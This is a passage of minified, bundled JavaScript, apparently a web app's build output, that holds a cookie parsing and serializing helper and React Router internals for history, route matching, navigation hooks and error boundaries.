        const oe = (ee == null ? void 0 : ee.decode) || V;
        let ue = 0;
        do {
            const fe = Q.indexOf("=", ue);
            if (fe === -1)
                break;
            const he = Q.indexOf(";", ue)
              , pe = he === -1 ? ne : he;
            if (fe > pe) {
                ue = Q.lastIndexOf(";", fe - 1) + 1;
                continue
            }
            const ye = X(Q, ue, fe)
              , be = Y(Q, fe, ye)
              , xe = Q.slice(ye, be);
            if (ae[xe] === void 0) {
                let Ae = X(Q, fe + 1, pe)
                  , Ee = Y(Q, pe, Ae);
                const Be = oe(Q.slice(Ae, Ee));
                ae[xe] = Be
            }
            ue = pe + 1
        } while (ue < ne);
        return ae
    }
    function X(Q, ee, ae) {
        do {
            const ne = Q.charCodeAt(ee);
            if (ne !== 32 && ne !== 9)
                return ee
        } while (++ee < ae);
        return ae
    }
    function Y(Q, ee, ae) {
        for (; ee > ae; ) {
            const ne = Q.charCodeAt(--ee);
            if (ne !== 32 && ne !== 9)
                return ee + 1
        }
        return ae
    }
    function F(Q, ee, ae) {
        const ne = (ae == null ? void 0 : ae.encode) || encodeURIComponent;
        if (!_.test(Q))
            throw new TypeError(`argument name is invalid: ${Q}`);
        const oe = ne(ee);
        if (!M.test(oe))
            throw new TypeError(`argument val is invalid: ${ee}`);
        let ue = Q + "=" + oe;
        if (!ae)
            return ue;
        if (ae.maxAge !== void 0) {
            if (!Number.isInteger(ae.maxAge))
                throw new TypeError(`option maxAge is invalid: ${ae.maxAge}`);
            ue += "; Max-Age=" + ae.maxAge
        }
        if (ae.domain) {
            if (!j.test(ae.domain))
                throw new TypeError(`option domain is invalid: ${ae.domain}`);
            ue += "; Domain=" + ae.domain
        }
        if (ae.path) {
            if (!O.test(ae.path))
                throw new TypeError(`option path is invalid: ${ae.path}`);
            ue += "; Path=" + ae.path
        }
        if (ae.expires) {
            if (!K(ae.expires) || !Number.isFinite(ae.expires.valueOf()))
                throw new TypeError(`option expires is invalid: ${ae.expires}`);
            ue += "; Expires=" + ae.expires.toUTCString()
        }
        if (ae.httpOnly && (ue += "; HttpOnly"),
        ae.secure && (ue += "; Secure"),
        ae.partitioned && (ue += "; Partitioned"),
        ae.priority)
            switch (typeof ae.priority == "string" ? ae.priority.toLowerCase() : void 0) {
            case "low":
                ue += "; Priority=Low";
                break;
            case "medium":
                ue += "; Priority=Medium";
                break;
            case "high":
                ue += "; Priority=High";
                break;
            default:
                throw new TypeError(`option priority is invalid: ${ae.priority}`)
            }
        if (ae.sameSite)
            switch (typeof ae.sameSite == "string" ? ae.sameSite.toLowerCase() : ae.sameSite) {
            case !0:
            case "strict":
                ue += "; SameSite=Strict";
                break;
            case "lax":
                ue += "; SameSite=Lax";
                break;
            case "none":
                ue += "; SameSite=None";
                break;
            default:
                throw new TypeError(`option sameSite is invalid: ${ae.sameSite}`)
            }
        return ue
    }
    function V(Q) {
        if (Q.indexOf("%") === -1)
            return Q;
        try {
            return decodeURIComponent(Q)
        } catch {
            return Q
        }
    }
    function K(Q) {
        return x.call(Q) === "[object Date]"
    }
    return dist$2
}
requireDist$2();
var PopStateEventType = "popstate";
function createBrowserHistory(_={}) {
    function M(O, x) {
        let {pathname: w, search: b, hash: X} = O.location;
        return createLocation("", {
            pathname: w,
            search: b,
            hash: X
        }, x.state && x.state.usr || null, x.state && x.state.key || "default")
    }
    function j(O, x) {
        return typeof x == "string" ? x : createPath(x)
    }
    return getUrlBasedHistory(M, j, null, _)
}
function invariant(_, M) {
    if (_ === !1 || _ === null || typeof _ > "u")
        throw new Error(M)
}
function warning(_, M) {
    if (!_) {
        typeof console < "u" && console.warn(M);
        try {
            throw new Error(M)
        } catch {}
    }
}
function createKey() {
    return Math.random().toString(36).substring(2, 10)
}
function getHistoryState(_, M) {
    return {
        usr: _.state,
        key: _.key,
        idx: M
    }
}
function createLocation(_, M, j=null, O) {
    return {
        pathname: typeof _ == "string" ? _ : _.pathname,
        search: "",
        hash: "",
        ...typeof M == "string" ? parsePath(M) : M,
        state: j,
        key: M && M.key || O || createKey()
    }
}
function createPath({pathname: _="/", search: M="", hash: j=""}) {
    return M && M !== "?" && (_ += M.charAt(0) === "?" ? M : "?" + M),
    j && j !== "#" && (_ += j.charAt(0) === "#" ? j : "#" + j),
    _
}
function parsePath(_) {
    let M = {};
    if (_) {
        let j = _.indexOf("#");
        j >= 0 && (M.hash = _.substring(j),
        _ = _.substring(0, j));
        let O = _.indexOf("?");
        O >= 0 && (M.search = _.substring(O),
        _ = _.substring(0, O)),
        _ && (M.pathname = _)
    }
    return M
}
function getUrlBasedHistory(_, M, j, O={}) {
    let {window: x=document.defaultView, v5Compat: w=!1} = O
      , b = x.history
      , X = "POP"
      , Y = null
      , F = V();
    F == null && (F = 0,
    b.replaceState({
        ...b.state,
        idx: F
    }, ""));
    function V() {
        return (b.state || {
            idx: null
        }).idx
    }
    function K() {
        X = "POP";
        let oe = V()
          , ue = oe == null ? null : oe - F;
        F = oe,
        Y && Y({
            action: X,
            location: ne.location,
            delta: ue
        })
    }
    function Q(oe, ue) {
        X = "PUSH";
        let fe = createLocation(ne.location, oe, ue);
        F = V() + 1;
        let he = getHistoryState(fe, F)
          , pe = ne.createHref(fe);
        try {
            b.pushState(he, "", pe)
        } catch (ye) {
            if (ye instanceof DOMException && ye.name === "DataCloneError")
                throw ye;
            x.location.assign(pe)
        }
        w && Y && Y({
            action: X,
            location: ne.location,
            delta: 1
        })
    }
    function ee(oe, ue) {
        X = "REPLACE";
        let fe = createLocation(ne.location, oe, ue);
        F = V();
        let he = getHistoryState(fe, F)
          , pe = ne.createHref(fe);
        b.replaceState(he, "", pe),
        w && Y && Y({
            action: X,
            location: ne.location,
            delta: 0
        })
    }
    function ae(oe) {
        return createBrowserURLImpl(oe)
    }
    let ne = {
        get action() {
            return X
        },
        get location() {
            return _(x, b)
        },
        listen(oe) {
            if (Y)
                throw new Error("A history only accepts one active listener");
            return x.addEventListener(PopStateEventType, K),
            Y = oe,
            () => {
                x.removeEventListener(PopStateEventType, K),
                Y = null
            }
        },
        createHref(oe) {
            return M(x, oe)
        },
        createURL: ae,
        encodeLocation(oe) {
            let ue = ae(oe);
            return {
                pathname: ue.pathname,
                search: ue.search,
                hash: ue.hash
            }
        },
        push: Q,
        replace: ee,
        go(oe) {
            return b.go(oe)
        }
    };
    return ne
}
function createBrowserURLImpl(_, M=!1) {
    let j = "http://localhost";
    typeof window < "u" && (j = window.location.origin !== "null" ? window.location.origin : window.location.href),
    invariant(j, "No window.location.(origin|href) available to create URL");
    let O = typeof _ == "string" ? _ : createPath(_);
    return O = O.replace(/ $/, "%20"),
    !M && O.startsWith("//") && (O = j + O),
    new URL(O,j)
}
function matchRoutes(_, M, j="/") {
    return matchRoutesImpl(_, M, j, !1)
}
function matchRoutesImpl(_, M, j, O) {
    let x = typeof M == "string" ? parsePath(M) : M
      , w = stripBasename(x.pathname || "/", j);
    if (w == null)
        return null;
    let b = flattenRoutes(_);
    rankRouteBranches(b);
    let X = null;
    for (let Y = 0; X == null && Y < b.length; ++Y) {
        let F = decodePath(w);
        X = matchRouteBranch(b[Y], F, O)
    }
    return X
}
function flattenRoutes(_, M=[], j=[], O="") {
    let x = (w, b, X) => {
        let Y = {
            relativePath: X === void 0 ? w.path || "" : X,
            caseSensitive: w.caseSensitive === !0,
            childrenIndex: b,
            route: w
        };
        Y.relativePath.startsWith("/") && (invariant(Y.relativePath.startsWith(O), `Absolute route path "${Y.relativePath}" nested under path "${O}" is not valid. An absolute child route path must start with the combined path of all its parent routes.`),
        Y.relativePath = Y.relativePath.slice(O.length));
        let F = joinPaths([O, Y.relativePath])
          , V = j.concat(Y);
        w.children && w.children.length > 0 && (invariant(w.index !== !0, `Index routes must not have child routes. Please remove all child routes from route path "${F}".`),
        flattenRoutes(w.children, M, V, F)),
        !(w.path == null && !w.index) && M.push({
            path: F,
            score: computeScore(F, w.index),
            routesMeta: V
        })
    }
    ;
    return _.forEach( (w, b) => {
        var X;
        if (w.path === "" || !((X = w.path) != null && X.includes("?")))
            x(w, b);
        else
            for (let Y of explodeOptionalSegments(w.path))
                x(w, b, Y)
    }
    ),
    M
}
function explodeOptionalSegments(_) {
    let M = _.split("/");
    if (M.length === 0)
        return [];
    let[j,...O] = M
      , x = j.endsWith("?")
      , w = j.replace(/\?$/, "");
    if (O.length === 0)
        return x ? [w, ""] : [w];
    let b = explodeOptionalSegments(O.join("/"))
      , X = [];
    return X.push(...b.map(Y => Y === "" ? w : [w, Y].join("/"))),
    x && X.push(...b),
    X.map(Y => _.startsWith("/") && Y === "" ? "/" : Y)
}
function rankRouteBranches(_) {
    _.sort( (M, j) => M.score !== j.score ? j.score - M.score : compareIndexes(M.routesMeta.map(O => O.childrenIndex), j.routesMeta.map(O => O.childrenIndex)))
}
var paramRe = /^:[\w-]+$/
  , dynamicSegmentValue = 3
  , indexRouteValue = 2
  , emptySegmentValue = 1
  , staticSegmentValue = 10
  , splatPenalty = -2
  , isSplat = _ => _ === "*";
function computeScore(_, M) {
    let j = _.split("/")
      , O = j.length;
    return j.some(isSplat) && (O += splatPenalty),
    M && (O += indexRouteValue),
    j.filter(x => !isSplat(x)).reduce( (x, w) => x + (paramRe.test(w) ? dynamicSegmentValue : w === "" ? emptySegmentValue : staticSegmentValue), O)
}
function compareIndexes(_, M) {
    return _.length === M.length && _.slice(0, -1).every( (O, x) => O === M[x]) ? _[_.length - 1] - M[M.length - 1] : 0
}
function matchRouteBranch(_, M, j=!1) {
    let {routesMeta: O} = _
      , x = {}
      , w = "/"
      , b = [];
    for (let X = 0; X < O.length; ++X) {
        let Y = O[X]
          , F = X === O.length - 1
          , V = w === "/" ? M : M.slice(w.length) || "/"
          , K = matchPath({
            path: Y.relativePath,
            caseSensitive: Y.caseSensitive,
            end: F
        }, V)
          , Q = Y.route;
        if (!K && F && j && !O[O.length - 1].route.index && (K = matchPath({
            path: Y.relativePath,
            caseSensitive: Y.caseSensitive,
            end: !1
        }, V)),
        !K)
            return null;
        Object.assign(x, K.params),
        b.push({
            params: x,
            pathname: joinPaths([w, K.pathname]),
            pathnameBase: normalizePathname(joinPaths([w, K.pathnameBase])),
            route: Q
        }),
        K.pathnameBase !== "/" && (w = joinPaths([w, K.pathnameBase]))
    }
    return b
}
function matchPath(_, M) {
    typeof _ == "string" && (_ = {
        path: _,
        caseSensitive: !1,
        end: !0
    });
    let[j,O] = compilePath(_.path, _.caseSensitive, _.end)
      , x = M.match(j);
    if (!x)
        return null;
    let w = x[0]
      , b = w.replace(/(.)\/+$/, "$1")
      , X = x.slice(1);
    return {
        params: O.reduce( (F, {paramName: V, isOptional: K}, Q) => {
            if (V === "*") {
                let ae = X[Q] || "";
                b = w.slice(0, w.length - ae.length).replace(/(.)\/+$/, "$1")
            }
            const ee = X[Q];
            return K && !ee ? F[V] = void 0 : F[V] = (ee || "").replace(/%2F/g, "/"),
            F
        }
        , {}),
        pathname: w,
        pathnameBase: b,
        pattern: _
    }
}
function compilePath(_, M=!1, j=!0) {
    warning(_ === "*" || !_.endsWith("*") || _.endsWith("/*"), `Route path "${_}" will be treated as if it were "${_.replace(/\*$/, "/*")}" because the \`*\` character must always follow a \`/\` in the pattern. To get rid of this warning, please change the route path to "${_.replace(/\*$/, "/*")}".`);
    let O = []
      , x = "^" + _.replace(/\/*\*?$/, "").replace(/^\/*/, "/").replace(/[\\.*+^${}|()[\]]/g, "\\$&").replace(/\/:([\w-]+)(\?)?/g, (b, X, Y) => (O.push({
        paramName: X,
        isOptional: Y != null
    }),
    Y ? "/?([^\\/]+)?" : "/([^\\/]+)"));
    return _.endsWith("*") ? (O.push({
        paramName: "*"
    }),
    x += _ === "*" || _ === "/*" ? "(.*)$" : "(?:\\/(.+)|\\/*)$") : j ? x += "\\/*$" : _ !== "" && _ !== "/" && (x += "(?:(?=\\/|$))"),
    [new RegExp(x,M ? void 0 : "i"), O]
}
function decodePath(_) {
    try {
        return _.split("/").map(M => decodeURIComponent(M).replace(/\//g, "%2F")).join("/")
    } catch (M) {
        return warning(!1, `The URL path "${_}" could not be decoded because it is a malformed URL segment. This is probably due to a bad percent encoding (${M}).`),
        _
    }
}
function stripBasename(_, M) {
    if (M === "/")
        return _;
    if (!_.toLowerCase().startsWith(M.toLowerCase()))
        return null;
    let j = M.endsWith("/") ? M.length - 1 : M.length
      , O = _.charAt(j);
    return O && O !== "/" ? null : _.slice(j) || "/"
}
function resolvePath(_, M="/") {
    let {pathname: j, search: O="", hash: x=""} = typeof _ == "string" ? parsePath(_) : _;
    return {
        pathname: j ? j.startsWith("/") ? j : resolvePathname(j, M) : M,
        search: normalizeSearch(O),
        hash: normalizeHash(x)
    }
}
function resolvePathname(_, M) {
    let j = M.replace(/\/+$/, "").split("/");
    return _.split("/").forEach(x => {
        x === ".." ? j.length > 1 && j.pop() : x !== "." && j.push(x)
    }
    ),
    j.length > 1 ? j.join("/") : "/"
}
function getInvalidPathError(_, M, j, O) {
    return `Cannot include a '${_}' character in a manually specified \`to.${M}\` field [${JSON.stringify(O)}].  Please separate it out to the \`to.${j}\` field. Alternatively you may provide the full path as a string in <Link to="..."> and the router will parse it for you.`
}
function getPathContributingMatches(_) {
    return _.filter( (M, j) => j === 0 || M.route.path && M.route.path.length > 0)
}
function getResolveToMatches(_) {
    let M = getPathContributingMatches(_);
    return M.map( (j, O) => O === M.length - 1 ? j.pathname : j.pathnameBase)
}
function resolveTo(_, M, j, O=!1) {
    let x;
    typeof _ == "string" ? x = parsePath(_) : (x = {
        ..._
    },
    invariant(!x.pathname || !x.pathname.includes("?"), getInvalidPathError("?", "pathname", "search", x)),
    invariant(!x.pathname || !x.pathname.includes("#"), getInvalidPathError("#", "pathname", "hash", x)),
    invariant(!x.search || !x.search.includes("#"), getInvalidPathError("#", "search", "hash", x)));
    let w = _ === "" || x.pathname === "", b = w ? "/" : x.pathname, X;
    if (b == null)
        X = j;
    else {
        let K = M.length - 1;
        if (!O && b.startsWith("..")) {
            let Q = b.split("/");
            for (; Q[0] === ".."; )
                Q.shift(),
                K -= 1;
            x.pathname = Q.join("/")
        }
        X = K >= 0 ? M[K] : "/"
    }
    let Y = resolvePath(x, X)
      , F = b && b !== "/" && b.endsWith("/")
      , V = (w || b === ".") && j.endsWith("/");
    return !Y.pathname.endsWith("/") && (F || V) && (Y.pathname += "/"),
    Y
}
var joinPaths = _ => _.join("/").replace(/\/\/+/g, "/")
  , normalizePathname = _ => _.replace(/\/+$/, "").replace(/^\/*/, "/")
  , normalizeSearch = _ => !_ || _ === "?" ? "" : _.startsWith("?") ? _ : "?" + _
  , normalizeHash = _ => !_ || _ === "#" ? "" : _.startsWith("#") ? _ : "#" + _;
function isRouteErrorResponse(_) {
    return _ != null && typeof _.status == "number" && typeof _.statusText == "string" && typeof _.internal == "boolean" && "data"in _
}
var validMutationMethodsArr = ["POST", "PUT", "PATCH", "DELETE"];
new Set(validMutationMethodsArr);
var validRequestMethodsArr = ["GET", ...validMutationMethodsArr];
new Set(validRequestMethodsArr);
var DataRouterContext = reactExports.createContext(null);
DataRouterContext.displayName = "DataRouter";
var DataRouterStateContext = reactExports.createContext(null);
DataRouterStateContext.displayName = "DataRouterState";
var ViewTransitionContext = reactExports.createContext({
    isTransitioning: !1
});
ViewTransitionContext.displayName = "ViewTransition";
var FetchersContext = reactExports.createContext(new Map);
FetchersContext.displayName = "Fetchers";
var AwaitContext = reactExports.createContext(null);
AwaitContext.displayName = "Await";
var NavigationContext = reactExports.createContext(null);
NavigationContext.displayName = "Navigation";
var LocationContext = reactExports.createContext(null);
LocationContext.displayName = "Location";
var RouteContext = reactExports.createContext({
    outlet: null,
    matches: [],
    isDataRoute: !1
});
RouteContext.displayName = "Route";
var RouteErrorContext = reactExports.createContext(null);
RouteErrorContext.displayName = "RouteError";
function useHref(_, {relative: M}={}) {
    invariant(useInRouterContext(), "useHref() may be used only in the context of a <Router> component.");
    let {basename: j, navigator: O} = reactExports.useContext(NavigationContext)
      , {hash: x, pathname: w, search: b} = useResolvedPath(_, {
        relative: M
    })
      , X = w;
    return j !== "/" && (X = w === "/" ? j : joinPaths([j, w])),
    O.createHref({
        pathname: X,
        search: b,
        hash: x
    })
}
function useInRouterContext() {
    return reactExports.useContext(LocationContext) != null
}
function useLocation() {
    return invariant(useInRouterContext(), "useLocation() may be used only in the context of a <Router> component."),
    reactExports.useContext(LocationContext).location
}
var navigateEffectWarning = "You should call navigate() in a React.useEffect(), not when your component is first rendered.";
function useIsomorphicLayoutEffect(_) {
    reactExports.useContext(NavigationContext).static || reactExports.useLayoutEffect(_)
}
function useNavigate() {
    let {isDataRoute: _} = reactExports.useContext(RouteContext);
    return _ ? useNavigateStable() : useNavigateUnstable()
}
function useNavigateUnstable() {
    invariant(useInRouterContext(), "useNavigate() may be used only in the context of a <Router> component.");
    let _ = reactExports.useContext(DataRouterContext)
      , {basename: M, navigator: j} = reactExports.useContext(NavigationContext)
      , {matches: O} = reactExports.useContext(RouteContext)
      , {pathname: x} = useLocation()
      , w = JSON.stringify(getResolveToMatches(O))
      , b = reactExports.useRef(!1);
    return useIsomorphicLayoutEffect( () => {
        b.current = !0
    }
    ),
    reactExports.useCallback( (Y, F={}) => {
        if (warning(b.current, navigateEffectWarning),
        !b.current)
            return;
        if (typeof Y == "number") {
            j.go(Y);
            return
        }
        let V = resolveTo(Y, JSON.parse(w), x, F.relative === "path");
        _ == null && M !== "/" && (V.pathname = V.pathname === "/" ? M : joinPaths([M, V.pathname])),
        (F.replace ? j.replace : j.push)(V, F.state, F)
    }
    , [M, j, w, x, _])
}
reactExports.createContext(null);
function useResolvedPath(_, {relative: M}={}) {
    let {matches: j} = reactExports.useContext(RouteContext)
      , {pathname: O} = useLocation()
      , x = JSON.stringify(getResolveToMatches(j));
    return reactExports.useMemo( () => resolveTo(_, JSON.parse(x), O, M === "path"), [_, x, O, M])
}
function useRoutes(_, M) {
    return useRoutesImpl(_, M)
}
function useRoutesImpl(_, M, j, O) {
    var ue;
    invariant(useInRouterContext(), "useRoutes() may be used only in the context of a <Router> component.");
    let {navigator: x} = reactExports.useContext(NavigationContext)
      , {matches: w} = reactExports.useContext(RouteContext)
      , b = w[w.length - 1]
      , X = b ? b.params : {}
      , Y = b ? b.pathname : "/"
      , F = b ? b.pathnameBase : "/"
      , V = b && b.route;
    {
        let fe = V && V.path || "";
        warningOnce(Y, !V || fe.endsWith("*") || fe.endsWith("*?"), `You rendered descendant <Routes> (or called \`useRoutes()\`) at "${Y}" (under <Route path="${fe}">) but the parent route path has no trailing "*". This means if you navigate deeper, the parent won't match anymore and therefore the child routes will never render.

Please change the parent <Route path="${fe}"> to <Route path="${fe === "/" ? "*" : `${fe}/*`}">.`)
    }
    let K = useLocation(), Q;
    if (M) {
        let fe = typeof M == "string" ? parsePath(M) : M;
        invariant(F === "/" || ((ue = fe.pathname) == null ? void 0 : ue.startsWith(F)), `When overriding the location using \`<Routes location>\` or \`useRoutes(routes, location)\`, the location pathname must begin with the portion of the URL pathname that was matched by all parent routes. The current pathname base is "${F}" but pathname "${fe.pathname}" was given in the \`location\` prop.`),
        Q = fe
    } else
        Q = K;
    let ee = Q.pathname || "/"
      , ae = ee;
    if (F !== "/") {
        let fe = F.replace(/^\//, "").split("/");
        ae = "/" + ee.replace(/^\//, "").split("/").slice(fe.length).join("/")
    }
    let ne = matchRoutes(_, {
        pathname: ae
    });
    warning(V || ne != null, `No routes matched location "${Q.pathname}${Q.search}${Q.hash}" `),
    warning(ne == null || ne[ne.length - 1].route.element !== void 0 || ne[ne.length - 1].route.Component !== void 0 || ne[ne.length - 1].route.lazy !== void 0, `Matched leaf route at location "${Q.pathname}${Q.search}${Q.hash}" does not have an element or Component. This means it will render an <Outlet /> with a null value by default resulting in an "empty" page.`);
    let oe = _renderMatches(ne && ne.map(fe => Object.assign({}, fe, {
        params: Object.assign({}, X, fe.params),
        pathname: joinPaths([F, x.encodeLocation ? x.encodeLocation(fe.pathname).pathname : fe.pathname]),
        pathnameBase: fe.pathnameBase === "/" ? F : joinPaths([F, x.encodeLocation ? x.encodeLocation(fe.pathnameBase).pathname : fe.pathnameBase])
    })), w, j, O);
    return M && oe ? reactExports.createElement(LocationContext.Provider, {
        value: {
            location: {
                pathname: "/",
                search: "",
                hash: "",
                state: null,
                key: "default",
                ...Q
            },
            navigationType: "POP"
        }
    }, oe) : oe
}
function DefaultErrorComponent() {
    let _ = useRouteError()
      , M = isRouteErrorResponse(_) ? `${_.status} ${_.statusText}` : _ instanceof Error ? _.message : JSON.stringify(_)
      , j = _ instanceof Error ? _.stack : null
      , O = "rgba(200,200,200, 0.5)"
      , x = {
        padding: "0.5rem",
        backgroundColor: O
    }
      , w = {
        padding: "2px 4px",
        backgroundColor: O
    }
      , b = null;
    return console.error("Error handled by React Router default ErrorBoundary:", _),
    b = reactExports.createElement(reactExports.Fragment, null, reactExports.createElement("p", null, " Hey developer "), reactExports.createElement("p", null, "You can provide a way better UX than this when your app throws errors by providing your own ", reactExports.createElement("code", {
        style: w
    }, "ErrorBoundary"), " or", " ", reactExports.createElement("code", {
        style: w
    }, "errorElement"), " prop on your route.")),
    reactExports.createElement(reactExports.Fragment, null, reactExports.createElement("h2", null, "Unexpected Application Error!"), reactExports.createElement("h3", {
        style: {
            fontStyle: "italic"
        }
    }, M), j ? reactExports.createElement("pre", {
        style: x
    }, j) : null, b)
}
var defaultErrorElement = reactExports.createElement(DefaultErrorComponent, null)
  , RenderErrorBoundary = class extends reactExports.Component {
    constructor(_) {
        super(_),
        this.state = {
            location: _.location,
            revalidation: _.revalidation,
            error: _.error
        }
    }
    static getDerivedStateFromError(_) {
        return {
            error: _
        }
    }
    static getDerivedStateFromProps(_, M) {
        return M.location !== _.location || M.revalidation !== "idle" && _.revalidation === "idle" ? {
            error: _.error,
            location: _.location,
            revalidation: _.revalidation
        } : {
            error: _.error !== void 0 ? _.error : M.error,
            location: M.location,
            revalidation: _.revalidation || M.revalidation
        }
    }
    componentDidCatch(_, M) {
        console.error("React Router caught the following error during render", _, M)
    }
    render() {
        return this.state.error !== void 0 ? reactExports.createElement(RouteContext.Provider, {
            value: this.props.routeContext
        }, reactExports.createElement(RouteErrorContext.Provider, {
            value: this.state.error,
            children: this.props.component
        })) : this.props.children
    }
}
;
function RenderedRoute({routeContext: _, match: M, children: j}) {
    let O = reactExports.useContext(DataRouterContext);
    return O && O.static && O.staticContext && (M.route.errorElement || M.route.ErrorBoundary) && (O.staticContext._deepestRenderedBoundaryId = M.route.id),
    reactExports.createElement(RouteContext.Provider, {
        value: _
    }, j)
}
function _renderMatches(_, M=[], j=null, O=null) {
    if (_ == null) {
        if (!j)
            return null;
        if (j.errors)
            _ = j.matches;
        else if (M.length === 0 && !j.initialized && j.matches.length > 0)
            _ = j.matches;
        else
            return null
    }
    let x = _
      , w = j == null ? void 0 : j.errors;
    if (w != null) {
        let Y = x.findIndex(F => F.route.id && (w == null ? void 0 : w[F.route.id]) !== void 0);
        invariant(Y >= 0, `Could not find a matching route for errors on route IDs: ${Object.keys(w).join(",")}`),
        x = x.slice(0, Math.min(x.length, Y + 1))
    }
    let b = !1
      , X = -1;
    if (j)
        for (let Y = 0; Y < x.length; Y++) {
            let F = x[Y];
            if ((F.route.HydrateFallback || F.route.hydrateFallbackElement) && (X = Y),
            F.route.id) {
                let {loaderData: V, errors: K} = j
                  , Q = F.route.loader && !V.hasOwnProperty(F.route.id) && (!K || K[F.route.id] === void 0);
                if (F.route.lazy || Q) {
                    b = !0,
                    X >= 0 ? x = x.slice(0, X + 1) : x = [x[0]];
                    break
                }
            }
        }
    return x.reduceRight( (Y, F, V) => {
        let K, Q = !1, ee = null, ae = null;
        j && (K = w && F.route.id ? w[F.route.id] : void 0,
        ee = F.route.errorElement || defaultErrorElement,
        b && (X < 0 && V === 0 ? (warningOnce("route-fallback", !1, "No `HydrateFallback` element provided to render during initial hydration"),
        Q = !0,
        ae = null) : X === V && (Q = !0,
        ae = F.route.hydrateFallbackElement || null)));
        let ne = M.concat(x.slice(0, V + 1))
          , oe = () => {
            let ue;
            return K ? ue = ee : Q ? ue = ae : F.route.Component ? ue = reactExports.createElement(F.route.Component, null) : F.route.element ? ue = F.route.element : ue = Y,
            reactExports.createElement(RenderedRoute, {
                match: F,
                routeContext: {
                    outlet: Y,
                    matches: ne,
                    isDataRoute: j != null
                },
                children: ue
            })
        }
        ;
        return j && (F.route.ErrorBoundary || F.route.errorElement || V === 0) ? reactExports.createElement(RenderErrorBoundary, {
            location: j.location,
            revalidation: j.revalidation,
            component: ee,
            error: K,
            children: oe(),
            routeContext: {
                outlet: null,
                matches: ne,
                isDataRoute: !0
            }
        }) : oe()
    }
    , null)
}
function getDataRouterConsoleError(_) {
    return `${_} must be used within a data router.  See https://reactrouter.com/en/main/routers/picking-a-router.`
}
function useDataRouterContext(_) {
    let M = reactExports.useContext(DataRouterContext);
    return invariant(M, getDataRouterConsoleError(_)),
    M
}
function useDataRouterState(_) {
    let M = reactExports.useContext(DataRouterStateContext);
    return invariant(M, getDataRouterConsoleError(_)),
    M
}
function useRouteContext(_) {
    let M = reactExports.useContext(RouteContext);
    return invariant(M, getDataRouterConsoleError(_)),
    M
}
function useCurrentRouteId(_) {
    let M = useRouteContext(_)
      , j = M.matches[M.matches.length - 1];
    return invariant(j.route.id, `${_} can only be used on routes that contain a unique "id"`),
    j.route.id
}
function useRouteId() {
    return useCurrentRouteId("useRouteId")
}
function useRouteError() {
    var O;
    let _ = reactExports.useContext(RouteErrorContext)
      , M = useDataRouterState("useRouteError")
      , j = useCurrentRouteId("useRouteError");
    return _ !== void 0 ? _ : (O = M.errors) == null ? void 0 : O[j]
}
function useNavigateStable() {
    let {router: _} = useDataRouterContext("useNavigate")
      , M = useCurrentRouteId("useNavigate")
      , j = reactExports.useRef(!1);
    return useIsomorphicLayoutEffect( () => {
        j.current = !0
    }
    ),
    reactExports.useCallback(async (x, w={}) => {
        warning(j.current, navigateEffectWarning),
        j.current && (typeof x == "number" ? _.navigate(x) : await _.navigate(x, {
            fromRouteId: M,
            ...w
        }))
    }
    , [_, M])
}
var alreadyWarned = {};
function warningOnce(_, M, j) {
    !M && !alreadyWarned[_] && (alreadyWarned[_] = !0,
    warning(!1, j))
}
reactExports.memo(DataRoutes);
function DataRoutes({routes: _, future: M, state: j}) {
    return useRoutesImpl(_, void 0, j, M)
}
function Route(_) {
    invariant(!1, "A <Route> is only ever to be used as the child of <Routes> element, never rendered directly. Please wrap your <Route> in a <Routes>.")
}
function Router({basename: _="/", children: M=null, location: j, navigationType: O="POP", navigator: x, static: w=!1}) {
    invariant(!useInRouterContext(), "You cannot render a <Router> inside another <Router>. You should never have more than one in your app.");
    let b = _.replace(/^\/*/, "/")
      , X = reactExports.useMemo( () => ({
        basename: b,
        navigator: x,
        static: w,
        future: {}
    }), [b, x, w]);
    typeof j == "string" && (j = parsePath(j));
    let {pathname: Y="/", search: F="", hash: V="", state: K=null, key: Q="default"} = j
      , ee = reactExports.useMemo( () => {
        let ae = stripBasename(Y, b);
        return ae == null ? null : {
            location: {
                pathname: ae,
                search: F,
                hash: V,
                state: K,
                key: Q
            },
            navigationType: O
        }
    }
    , [b, Y, F, V, K, Q, O]);
    return warning(ee != null, `<Router basename="${b}"> is not able to match the URL "${Y}${F}${V}" because it does not start with the basename, so the <Router> won't render anything.`),
    ee == null ? null : reactExports.createElement(NavigationContext.Provider, {
        value: X
    }, reactExports.createElement(LocationContext.Provider, {
        children: M,
        value: ee
    }))
}
function Routes({children: _, location: M}) {
    return useRoutes(createRoutesFromChildren(_), M)
}
function createRoutesFromChildren(_, M=[]) {
    let j = [];
    return reactExports.Children.forEach(_, (O, x) => {
        if (!reactExports.isValidElement(O))
            return;
        let w = [...M, x];
        if (O.type === reactExports.Fragment) {
            j.push.apply(j, createRoutesFromChildren(O.props.children, w));
            return
        }
        invariant(O.type === Route, `[${typeof O.type == "string" ? O.type : O.type.name}] is not a <Route> component. All component children of <Routes> must be a <Route> or <React.Fragment>`),
        invariant(!O.props.index || !O.props.children, "An index route cannot have child routes.");
        let b = {
            id: O.props.id || w.join("-"),
            caseSensitive: O.props.caseSensitive,
            element: O.props.element,
            Component: O.props.Component,
            index: O.props.index,
            path: O.props.path,
            loader: O.props.loader,
            action: O.props.action,
            hydrateFallbackElement: O.props.hydrateFallbackElement,
            HydrateFallback: O.props.HydrateFallback,
            errorElement: O.props.errorElement,
            ErrorBoundary: O.props.ErrorBoundary,
            hasErrorBoundary: O.props.hasErrorBoundary === !0 || O.props.ErrorBoundary != null || O.props.errorElement != null,
            shouldRevalidate: O.props.shouldRevalidate,
            handle: O.props.handle,
            lazy: O.props.lazy
        };
        O.props.children && (b.children = createRoutesFromChildren(O.props.children, w)),
        j.push(b)
    }
    ),
    j
}
var defaultMethod = "get"
  , defaultEncType = "application/x-www-form-urlencoded";
function isHtmlElement(_) {
    return _ != null && typeof _.tagName == "string"
}
function isButtonElement(_) {
    return isHtmlElement(_) && _.tagName.toLowerCase() === "button"
}
function isFormElement(_) {
    return isHtmlElement(_) && _.tagName.toLowerCase() === "form"
}
function isInputElement(_) {
    return isHtmlElement(_) && _.tagName.toLowerCase() === "input"
}
function isModifiedEvent(_) {
    return !!(_.metaKey || _.altKey || _.ctrlKey || _.shiftKey)
}
function shouldProcessLinkClick(_, M) {
    return _.button === 0 && (!M || M === "_self") && !isModifiedEvent(_)
}
var _formDataSupportsSubmitter = null;
function isFormDataSubmitterSupported() {
    if (_formDataSupportsSubmitter === null)
        try {
            new FormData(document.createElement("form"),0),
            _formDataSupportsSubmitter = !1
        } catch {
            _formDataSupportsSubmitter = !0
        }
    return _formDataSupportsSubmitter
}
